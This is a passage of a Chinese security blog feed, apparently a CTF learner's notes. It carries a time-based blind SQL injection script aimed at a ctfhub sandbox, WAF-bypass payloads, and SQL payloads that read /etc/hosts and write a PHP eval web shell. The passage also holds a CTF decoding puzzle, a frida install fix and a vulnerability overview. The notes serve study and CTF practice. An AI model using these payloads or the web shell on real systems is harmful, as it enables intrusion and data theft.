operator">=</span>name<span class="token operator">+</span>k        <span class="token keyword">break</span><span class="token keyword">print</span><span class="token punctuation">(</span>name<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>得到表名</p><h5 id="1-3-4-时间盲注"><a href="#1-3-4-时间盲注" class="headerlink" title="1.3.4 时间盲注"></a>1.3.4 时间盲注</h5><p>在<code>?id=1</code> 后面添加 <code>and sleep(10)</code><br>这个延迟时间测试是否有时间盲注的时候设长一点，因为是手动测试是否有漏洞，为了避免网络的原因让我们漏掉漏洞，sleep(10)之后可以看到网站有明显的延迟，证明时间盲注存在<br>时间盲注会用到<code>sleep(time)</code>函数，还有if函数<br><code>if(1,2,3)</code>：如果1真，则执行2，否则执行3<br><code>Sleep(x)</code>：执行延迟x秒<br>先判断数据库的长度和数据库名称<br>具体脚本</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> requests<span class="token keyword">import</span> time<span class="token keyword">import</span> string<span class="token keyword">import</span> sysheaders <span class="token operator">=</span> <span class="token punctuation">{</span><span class="token string">"user-agent"</span><span class="token punctuation">:</span><span class="token string">"Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; 360SE)"</span><span class="token punctuation">}</span>chars <span class="token operator">=</span> <span class="token string">'abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'</span>database <span class="token operator">=</span> <span class="token string">''</span><span class="token keyword">global</span> length<span class="token keyword">for</span> l <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span><span class="token number">20</span><span class="token punctuation">)</span><span class="token punctuation">:</span>      lengthUrl <span class="token operator">=</span> 'http<span class="token punctuation">:</span><span class="token operator">//</span>challenge<span class="token operator">-</span>c13b65fc664e2e69<span class="token punctuation">.</span>sandbox<span class="token punctuation">.</span>ctfhub<span class="token punctuation">.</span>com<span class="token punctuation">:</span><span class="token number">10080</span><span class="token operator">/</span>?       <span class="token operator">+</span><span class="token string">'id=1 and if(length(database())&gt;{0},1,sleep(3))--+'</span>       lengthUrlFormat <span class="token operator">=</span> lengthUrl<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span>  <span class="token comment">#判断数据长度</span>      start_time0 <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token comment">#获取时间    </span>       rsp0 <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>lengthUrlFormat<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>    <span class="token keyword">if</span>  time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time0 <span class="token operator">&gt;</span> <span class="token number">2.5</span><span class="token punctuation">:</span>              <span class="token keyword">print</span> <span class="token string">'database length is '</span> <span class="token operator">+</span> <span class="token builtin">str</span><span class="token punctuation">(</span>l<span class="token punctuation">)</span>            <span class="token keyword">global</span> length               length <span class="token operator">=</span> l               <span class="token keyword">break</span>       <span class="token keyword">else</span><span class="token punctuation">:</span>           <span class="token keyword">pass</span><span class="token keyword">for</span> i <span class="token keyword">in</span> <span class="token builtin">range</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">,</span>length<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">:</span> <span class="token comment">#根据长度来弄出名</span>      <span class="token keyword">for</span> char <span class="token keyword">in</span> chars<span class="token punctuation">:</span> <span class="token comment">#chars是所有字符 anbcd...</span>          charAscii <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>char<span class="token punctuation">)</span>  <span class="token comment">#全部大写</span>          url <span class="token operator">=</span> 'http<span class="token punctuation">:</span><span class="token operator">//</span>challenge<span class="token operator">-</span>c13b65fc664e2e69<span class="token punctuation">.</span>sandbox<span class="token punctuation">.</span>ctfhub<span class="token punctuation">.</span>com<span class="token punctuation">:</span><span class="token number">10080</span><span class="token operator">/</span>?<span class="token builtin">id</span><span class="token operator">=</span><span class="token number">1</span>            <span class="token operator">+</span><span class="token string">'and if(ascii(substr(database(),{0},1))&gt;{1},1,sleep(3))--+'</span>          urlformat <span class="token operator">=</span> url<span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>i<span class="token punctuation">,</span>charAscii<span class="token punctuation">)</span> <span class="token comment">#名的第i个字符，与某个字符比较</span>           start_time <span class="token operator">=</span> time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span>        rsp <span class="token operator">=</span> requests<span class="token punctuation">.</span>get<span class="token punctuation">(</span>urlformat<span class="token punctuation">,</span>headers<span class="token operator">=</span>headers<span class="token punctuation">)</span><span class="token comment">#访问</span>         <span class="token keyword">if</span>  time<span class="token punctuation">.</span>time<span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">-</span> start_time <span class="token operator">&gt;</span> <span class="token number">2.5</span><span class="token punctuation">:</span>               database<span class="token operator">+=</span>char              <span class="token keyword">print</span> <span class="token string">'database: '</span><span class="token punctuation">,</span>database               <span class="token keyword">break</span>           <span class="token keyword">else</span><span class="token punctuation">:</span>              <span class="token keyword">pass</span><span class="token keyword">print</span> <span class="token string">'database is '</span> <span class="token operator">+</span> database<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="1-3-5-二次注入"><a href="#1-3-5-二次注入" class="headerlink" title="1.3.5 二次注入"></a>1.3.5 二次注入</h5><p>二次注入是因为数据在第一次进入数据库的时候进行了过滤和转义<br>当这条数据从数据取出来在sql语句中进行拼接，而这次拼接中没有过滤<br>一般比较难发现，所以比赛中很难发现，一般CTF出题人会给源码，或者提示<br>二次注入也一般不是单纯的二次注入，通常还有报错注入或bool盲注，要写脚本模拟</p><h4 id="2、找到漏洞"><a href="#2、找到漏洞" class="headerlink" title="2、找到漏洞"></a>2、找到漏洞</h4><p>再谈一谈怎么发现注入点<br>常见的注入点位置有</p><ol><li><p>GET参数的注入</p><p> 这个最容易发现，就是参数在url中，如<a href="http://www.ex1t.com/?id=1">www.ex1t.com?id=1</a></p></li><li><p>POST参数的注入</p><p> 这个需要通过抓包，使用burp或者浏览器插件hackbar等</p></li><li><p>User-Agent的注入</p><p> 使用Burp的Repeater模块（重发器）当然，以上都可以使用sqlmap来测试。<br> 一般注入点都发生在常进行数据变动的地方，比如进行数据查询</p></li></ol><p>然后再判断是否有注入</p><p>1.输入单引号</p><pre><code>最常见检测，让sql语句产生单引号未闭合错误</code></pre><ol start="2"><li><p>注入类型判断</p><p> and 1=1(数字型) 和 ‘and ‘1’=’1(字符串)和 %’ and ‘%’=’(搜索型)进行判断</p></li><li><p>通过数字加减来判断是不是整数型</p><p>id=3-1结果和id=2结果是否一样。<br>日常中常用的还是单引号，and，or</p></li></ol><h4 id="3、绕过过滤"><a href="#3、绕过过滤" class="headerlink" title="3、绕过过滤"></a>3、绕过过滤</h4><p>通常会有以下方式防Sql注入</p><h5 id="3-1-过滤关键词"><a href="#3-1-过滤关键词" class="headerlink" title="3.1 过滤关键词"></a>3.1 过滤关键词</h5><h6 id="3-1-1-过滤select、or、from等关键字"><a href="#3-1-1-过滤select、or、from等关键字" class="headerlink" title="3.1.1 过滤select、or、from等关键字"></a>3.1.1 过滤select、or、from等关键字</h6><p>有些题目是将关键词替换为空，这时候能使用穿插关键字方法绕过<br>那可以通过双写，大小写绕过</p><ol><li>双写</li></ol><ul><li>selselectect –&gt; select</li><li>oorr –&gt; or</li></ul><ol start="2"><li>大小写</li></ol><ul><li>SeLect</li><li>Or</li></ul><h6 id="3-1-2-如果只是过滤了or-and-xor-not等等"><a href="#3-1-2-如果只是过滤了or-and-xor-not等等" class="headerlink" title="3.1.2 如果只是过滤了or and xor not等等"></a>3.1.2 如果只是过滤了or and xor not等等</h6><ul><li>and = &amp;&amp;</li><li>or = ||</li><li>xor = | # 异或</li><li>not = !</li></ul><h6 id="3-1-3-有时候过滤函数是通过十六进制进行过滤。"><a href="#3-1-3-有时候过滤函数是通过十六进制进行过滤。" class="headerlink" title="3.1.3 有时候过滤函数是通过十六进制进行过滤。"></a>3.1.3 有时候过滤函数是通过十六进制进行过滤。</h6><p>可以对关键字的个别字符进行替换</p><pre><code>    select --&amp;gt; selec\x74</code></pre><p>有时候通过双重URL编码进行绕过操作</p><pre><code>    %25%36%66%25%37%32 --&amp;gt; %6f%72 --&amp;gt; or</code></pre><p>还有内联注释绕过<br>内联注释就是把一些特有的仅在MYSQL上的语句放在 /<em>!…</em>/ 中，这样这些语句如果在其它数据库中是不会被执行，但在MYSQL中会执行。<br><code>mysql&amp;gt; select * from users where id = -1 union /*!select*/ 1,2,3;</code></p><h5 id="3-2-过滤空格"><a href="#3-2-过滤空格" class="headerlink" title="3.2 过滤空格"></a>3.2 过滤空格</h5><h6 id="3-2-1-通过注释绕过，一般的注释符有如下几个"><a href="#3-2-1-通过注释绕过，一般的注释符有如下几个" class="headerlink" title="3.2.1 通过注释绕过，一般的注释符有如下几个"></a>3.2.1 通过注释绕过，一般的注释符有如下几个</h6><ul><li>#</li><li>--<br>//</li><li>/**/</li><li>;%00</li></ul><p>可以通过注释符来绕过空格</p><pre class="line-numbers language-none"><code class="language-none">select/**/name/**/from/**/user<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="3-2-2-通过URL编码绕过，我们知道空格-20，所以可以通过二次URL编码进行绕过"><a href="#3-2-2-通过URL编码绕过，我们知道空格-20，所以可以通过二次URL编码进行绕过" class="headerlink" title="3.2.2 通过URL编码绕过，我们知道空格%20，所以可以通过二次URL编码进行绕过"></a>3.2.2 通过URL编码绕过，我们知道空格%20，所以可以通过二次URL编码进行绕过</h6><pre class="line-numbers language-none"><code class="language-none">%20 --&gt; %2520<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="3-2-3-通过空白字符绕过，各个数据库都有一些空白字符"><a href="#3-2-3-通过空白字符绕过，各个数据库都有一些空白字符" class="headerlink" title="3.2.3 通过空白字符绕过，各个数据库都有一些空白字符"></a>3.2.3 通过空白字符绕过，各个数据库都有一些空白字符</h6><pre class="line-numbers language-none"><code class="language-none">MySQL5--09,0A,0B,0C,0D,A0,20<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h6 id="3-2-4-通过特殊字符（如括号，反引号等）"><a href="#3-2-4-通过特殊字符（如括号，反引号等）" class="headerlink" title="3.2.4 通过特殊字符（如括号，反引号等）"></a>3.2.4 通过特殊字符（如括号，反引号等）</h6><pre><code>select(user())</code></pre><h6 id="3-2-5-科学计数法绕过"><a href="#3-2-5-科学计数法绕过" class="headerlink" title="3.2.5 科学计数法绕过"></a>3.2.5 科学计数法绕过</h6><pre class="line-numbers language-none"><code class="language-none">select user,password from users where user_id=0e1union select 1,2<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h5 id="3-3-过滤单引号"><a href="#3-3-过滤单引号" class="headerlink" title="3.3 过滤单引号"></a>3.3 过滤单引号</h5><p>过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为\ ' 。</p><pre><code>id=-1%df%27union select 1,user(),3--+</code></pre><p>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：</p><ol><li>%df 吃掉 \ 具体的方法是 urlencode(‘) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：</li><li>将 ' 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。</li></ol><pre class="line-numbers language-none"><code class="language-none">%df%27=====(addslashes)======&gt;%df%5c%27======(GBK)======&gt;運’id=-1%df%27union select 1,user(),3--+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h5 id="3-4-过滤等号"><a href="#3-4-过滤等号" class="headerlink" title="3.4 过滤等号"></a>3.4 过滤等号</h5><p>使用like 、rlike 、regexp 或者 使用比较符（）</p><h5 id="3-5-过滤逗号"><a href="#3-5-过滤逗号" class="headerlink" title="3.5 过滤逗号"></a>3.5 过滤逗号</h5><p>可以使用join方法绕过</p><pre class="line-numbers language-none"><code class="language-none">union select 1,2,3 join语句： union select * from (select 1)a join (select 2)b join (select 3) <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="3-6-过滤比较符（）"><a href="#3-6-过滤比较符（）" class="headerlink" title="3.6 过滤比较符（）"></a>3.6 过滤比较符（）</h5><p>使用greatest()、least（）：（前者返回最大值，后者返回最小值）</p><h5 id="3-7-过滤注释符（-–）"><a href="#3-7-过滤注释符（-–）" class="headerlink" title="3.7 过滤注释符（#,–）"></a>3.7 过滤注释符（#,–）</h5><pre class="line-numbers language-none"><code class="language-none">id=1' union select 1,2,3||'1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>最后的or ‘1闭合查询语句的最后的单引号，或者：</p><pre class="line-numbers language-none"><code class="language-none">id=1' union select 1,2,'3<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>3.8 进行编码绕过</p><p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p><pre class="line-numbers language-none"><code class="language-none">or 1=1%6f%72%20%31%3d%31CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="4-SQL读写文件"><a href="#4-SQL读写文件" class="headerlink" title="4 SQL读写文件"></a>4 SQL读写文件</h4><p>在了解SQL注入的原理、方法、过滤之后</p><p>继续学习一下SQL读写文件</p><p>CTF中有的flag在文件中，但是存在SQL注入，渗透过程中，你也可以写入木马文件</p><p>在具有file权限的情况下，使用load_file和into  outfile/dumpfile进行读写</p><p>读取文件</p><pre class="line-numbers language-none"><code class="language-none">?id=-1+union+select+load_file('/etc/hosts')<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>在某些绕过单引号的情况下，可以使用文件名的十六进制来作为load_file函数的参数</p><pre class="line-numbers language-none"><code class="language-none">?id=-1+union+select+load_file(0x2f6574632f686f737473)<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>也可以通过sql写文件</p><pre class="line-numbers language-none"><code class="language-none">?id=-1+union+select+’&lt;?php eval($_POST[-7]);&gt;‘+into+outfile'/var/www/html/shell.php'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>或</p><pre class="line-numbers language-none"><code class="language-none">?id=-1+union+select+unhex(一句话shell的十六进制)+into+dumpfile'/var/www/html/shell.php'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>值得注意的是，除了要有写文件的权限，文件名不能是已存在的.</p><h4 id="5-总结"><a href="#5-总结" class="headerlink" title="5 总结"></a>5 总结</h4><p>就此关于SQL注入的总结已经完成了，最近在看CTF特训营，顿时发觉自己学的还很浅，于是觉得该好好的总结一次。除了CTF特训营上的内容，还有以前浏览网上各大博主发表的wp、总结等所记录的笔记，学会了很多。如果本文存在错误或有其他问题以及还存在补充，敬请指正。</p>]]></content>
      
      
      
        <tags>
            
            <tag> 漏洞 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一题python加密题</title>
      <link href="2020/07/08/%E4%B8%80%E9%A2%98python%E5%8A%A0%E5%AF%86%E9%A2%98/"/>
      <url>2020/07/08/%E4%B8%80%E9%A2%98python%E5%8A%A0%E5%AF%86%E9%A2%98/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.ex1t.xyz/20200708115429.jpeg"></p><blockquote><p>之前做ctf过程中遇到了一个使用python写写的加密程序.</p></blockquote><h2 id="加密过程源码"><a href="#加密过程源码" class="headerlink" title="加密过程源码"></a>加密过程源码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64<span class="token keyword">def</span> <span class="token function">encode1</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> ans<span class="token punctuation">:</span>        x <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">36</span>        x <span class="token operator">=</span> x <span class="token operator">+</span> <span class="token number">25</span>        s <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">return</span> s<span class="token keyword">def</span> <span class="token function">encode2</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> ans<span class="token punctuation">:</span>        x <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token number">36</span>        x <span class="token operator">=</span> x <span class="token operator">^</span> <span class="token number">36</span>        s <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">return</span> s<span class="token keyword">def</span> <span class="token function">encode3</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> base64<span class="token punctuation">.</span>b32encode<span class="token punctuation">(</span>ans<span class="token punctuation">)</span>flag <span class="token operator">=</span> <span class="token string">' '</span><span class="token keyword">print</span> <span class="token string">'Please Input your flag:'</span>flag <span class="token operator">=</span> <span class="token builtin">raw_input</span><span class="token punctuation">(</span><span class="token punctuation">)</span>final <span class="token operator">=</span> <span class="token string">'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==='</span><span class="token keyword">if</span> encode3<span class="token punctuation">(</span>encode2<span class="token punctuation">(</span>encode1<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">==</span> final<span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token string">'correct'</span><span class="token keyword">else</span><span class="token punctuation">:</span>    <span class="token keyword">print</span> <span class="token string">'wrong'</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="解密算法源码"><a href="#解密算法源码" class="headerlink" title="解密算法源码"></a>解密算法源码</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64final <span class="token operator">=</span> <span class="token string">'UC7KOWVXWVNKNIC2XCXKHKK2W5NLBKNOUOSK3LNNVWW3E==='</span><span class="token keyword">def</span> <span class="token function">decode3</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> base64<span class="token punctuation">.</span>b32decode<span class="token punctuation">(</span>ans<span class="token punctuation">)</span>    <span class="token keyword">return</span> s<span class="token keyword">def</span> <span class="token function">decode2</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> ans<span class="token punctuation">:</span>        x <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token number">36</span>        x <span class="token operator">=</span> x <span class="token operator">-</span> <span class="token number">36</span>        s <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">return</span> s<span class="token keyword">def</span> <span class="token function">decode1</span><span class="token punctuation">(</span>ans<span class="token punctuation">)</span><span class="token punctuation">:</span>    s <span class="token operator">=</span> <span class="token string">''</span>    <span class="token keyword">for</span> i <span class="token keyword">in</span> ans<span class="token punctuation">:</span>        x <span class="token operator">=</span> <span class="token builtin">ord</span><span class="token punctuation">(</span>i<span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">25</span>        x <span class="token operator">=</span> x <span class="token operator">^</span> <span class="token number">36</span>        s <span class="token operator">+=</span> <span class="token builtin">chr</span><span class="token punctuation">(</span>x<span class="token punctuation">)</span>    <span class="token keyword">return</span> sth <span class="token operator">=</span> decode3<span class="token punctuation">(</span>final<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>th<span class="token punctuation">)</span>se <span class="token operator">=</span> decode2<span class="token punctuation">(</span>th<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>se<span class="token punctuation">)</span>fr <span class="token operator">=</span> decode1<span class="token punctuation">(</span>se<span class="token punctuation">)</span><span class="token keyword">print</span><span class="token punctuation">(</span>fr<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> Ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>mac下安装frida报错解决方法</title>
      <link href="2020/05/12/mac%E4%B8%8B%E5%AE%89%E8%A3%85frida%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/"/>
      <url>2020/05/12/mac%E4%B8%8B%E5%AE%89%E8%A3%85frida%E6%8A%A5%E9%94%99%E8%A7%A3%E5%86%B3%E6%96%B9%E6%B3%95/</url>
      
        <content type="html"><![CDATA[<h1 id="mac下安装frida报错解决方法"><a href="#mac下安装frida报错解决方法" class="headerlink" title="mac下安装frida报错解决方法"></a>mac下安装frida报错解决方法</h1><p>报错截图</p><p><img src="http://img.ex1t.xyz/20200512130536.png" alt="image-20200512130533292"></p><p>ssl的原因解决方法</p><p><code>sudo /Applications/Python\ 3.7/Install\ Certificates.command</code></p><p><img src="http://img.ex1t.xyz/20200512130756.png" alt="image-20200512130753246"></p><p>之后执行安装就可以了</p><p><img src="http://img.ex1t.xyz/20200512130825.png" alt="image-20200512130823453"></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>常见漏洞描述</title>
      <link href="2020/05/09/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%AE%80%E8%BF%B0/"/>
      <url>2020/05/09/%E5%B8%B8%E8%A7%81%E6%BC%8F%E6%B4%9E%E7%AE%80%E8%BF%B0/</url>
      
        <content type="html"><![CDATA[<p><img src="http://img.ex1t.xyz/20201230173056.jpg"></p><p>漏洞主要分为XSS注入、SQL注入、服务漏洞、文件上传、命令执行、文件包含、csrf、ssrf、反序列化等</p><h5 id="（1）XSS注入"><a href="#（1）XSS注入" class="headerlink" title="（1）XSS注入"></a>（1）XSS注入</h5><p><code>XSS攻击是通过注入恶意代码到用户浏览器的网页上，从而达到劫持用户回话的目的</code></p><h5 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h5><pre><code>网络钓鱼，包括盗取各类的用户账号窃取用户cookie窃取用户浏览请回话强制弹出广告页面、刷流量网络挂马提升用户权限，进一步渗透网站传播跨站脚本等</code></pre><h5 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h5><pre><code>（1）存储型：存储型保存到服务器上，只要访问这个页面就会触发，然后可以盗取信息。（2）反射型：也称作非持久型、参数型跨站脚本，非持久化,需要欺骗用户自己去点击链接才能触发XSS代码。（3）DOM型：这种类型则是利用非法输入来闭合对应的html标签。</code></pre><h5 id="出现原因"><a href="#出现原因" class="headerlink" title="出现原因"></a>出现原因</h5><pre><code>如在个人信息或发表文章等地方,加入代码,如果没有过滤或过滤不严,那么这些代码将储存到服务器中,用户访问该页面的时候触发代码执行</code></pre><h5 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h5><pre><code>1、过滤恶意代码2、待补充</code></pre><h5 id="实战-XSS挑战"><a href="#实战-XSS挑战" class="headerlink" title="实战-XSS挑战"></a>实战-XSS挑战</h5><pre><code>   [http://test.ctf8.com/](http://test.ctf8.com/   "http://test.ctf8.com/")</code></pre><h5 id="2-SQL注入"><a href="#2-SQL注入" class="headerlink" title="(2) SQL注入"></a>(2) SQL注入</h5><p><code>SQL注入是再web应用程序中事先定义好的查询语句添加额外的SQL语句，在管理员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询。</code></p><h5 id="危害-1"><a href="#危害-1" class="headerlink" title="危害"></a>危害</h5><pre><code>数据库信息泄漏数据库被恶意操作</code></pre><h5 id="分类-1"><a href="#分类-1" class="headerlink" title="分类"></a>分类</h5><p>根据后台数据库类型分类-不同的数据库注入语句有所不同</p><pre><code>Mysql：免费的，适用于中小型网站 。SQL Server：微软的一个关系型数据库，适用于中大型网站 。Oracle：支持多用户，大事务量的处理，适用于中大型网站 。Access：微软开发的一个小型数据库，适用于小网站。待补充</code></pre><p>根据注入方式分类</p><pre><code>整数型注入字符型注入报错注入布尔注入时间盲注待补充</code></pre><p>分类方式待补充</p><h5 id="出现原因-1"><a href="#出现原因-1" class="headerlink" title="出现原因"></a>出现原因</h5><pre><code>程序开发过程中不注意书写规范，对sql语句和关键字未进行过滤，导致客户端可以通过全局变量get或者post提交sql语句到服务器端正常运行;个人理解：对用户查询的语句未进行限制，导致用户采用拼接的方式来进行对数据库的恶意操作。</code></pre><h5 id="防范措施-1"><a href="#防范措施-1" class="headerlink" title="防范措施"></a>防范措施</h5><pre><code>拒绝已知的不良输入，即建立黑名单库接受已知的正常输入，即建立白名单库净化数据，对可能存在的恶意字符进行编码或转义后台使用正确的代码语法检查</code></pre><h5 id="实战"><a href="#实战" class="headerlink" title="实战"></a>实战</h5><pre><code>ctfhub.com   技能树/web/sql注入</code></pre><h5 id="3-服务漏洞"><a href="#3-服务漏洞" class="headerlink" title="(3) 服务漏洞"></a>(3) 服务漏洞</h5><p><code>待补充</code></p><h5 id="4-文件上传漏洞"><a href="#4-文件上传漏洞" class="headerlink" title="(4) 文件上传漏洞"></a>(4) 文件上传漏洞</h5><p><code>由于开发则在对用户文件上传功能实现代码上没有严格限制用户上传的文件后缀以及文件类型或者处理缺陷,而导致用户可以越过其本身权限向服务器上上传可执行的动态脚本文件:</code></p><h5 id="危害-2"><a href="#危害-2" class="headerlink" title="危害"></a>危害</h5><pre><code>导致网站甚至整个服务器被控制</code></pre><h5 id="分类-2"><a href="#分类-2" class="headerlink" title="分类"></a>分类</h5><pre><code>任意文件上传后缀大小写绕过文件类型绕过双写后缀名绕过请求特殊后缀绕过图片木马合并上传文件00截断绕过待补充</code></pre><h5 id="出现原因-2"><a href="#出现原因-2" class="headerlink" title="出现原因"></a>出现原因</h5><pre><code>对上传的文件未进行严格的检测。</code></pre><h5 id="防范措施-2"><a href="#防范措施-2" class="headerlink" title="防范措施"></a>防范措施</h5><pre><code>1. 检查文件上传路径 2. 文件扩展名检测3. 文件 MIME验证4. 文件内容检测 5. 图片二次渲染 6. 文件重命名待补充</code></pre><h5 id="实战-1"><a href="#实战-1" class="headerlink" title="实战"></a>实战</h5><pre><code>ctfhub.com   技能树/web/文件上传</code></pre><h5 id="5-命令执行漏洞"><a href="#5-命令执行漏洞" class="headerlink" title="(5) 命令执行漏洞"></a>(5) 命令执行漏洞</h5><p><code>应用在调用函数执行系统命令的时候，如果将用户的输入作为系统命令的参数拼接到命令行中，在没有过滤用户的输入的情况下，就会造成命令执行漏洞。</code></p><h5 id="危害-3"><a href="#危害-3" class="headerlink" title="危害"></a>危害</h5><pre><code>导致网站甚至整个服务器被控制</code></pre><h5 id="出现原因-3"><a href="#出现原因-3" class="headerlink" title="出现原因"></a>出现原因</h5><pre><code>对于用户的输入未进行严格的检测</code></pre><h5 id="防范措施-3"><a href="#防范措施-3" class="headerlink" title="防范措施"></a>防范措施</h5><pre><code>1. 关闭此功能2. 对用户输入进行过滤3. 限制输入格式待补充</code></pre><h5 id="实战-2"><a href="#实战-2" class="headerlink" title="实战"></a>实战</h5><pre><code>github.com  技能树/RCE/命令注入</code></pre><h5 id="6-文件包含漏洞"><a href="#6-文件包含漏洞" class="headerlink" title="(6) 文件包含漏洞"></a>(6) 文件包含漏洞</h5><p><code>服务器执行PHP文件时，可以通过文件包含函数加载另一个文件中的PHP代码</code></p><h5 id="危害-4"><a href="#危害-4" class="headerlink" title="危害"></a>危害</h5><pre><code>导致网站甚至整个服务器被控制</code></pre><h5 id="分类-3"><a href="#分类-3" class="headerlink" title="分类"></a>分类</h5><p>本地文件包含,当被包含的文件在服务器本地时，就形成本地文件包含<br>远程文件包含RFI,当被包含的文件在第三方服务器时，叫做远程文件包含。</p><h5 id="出现原因-4"><a href="#出现原因-4" class="headerlink" 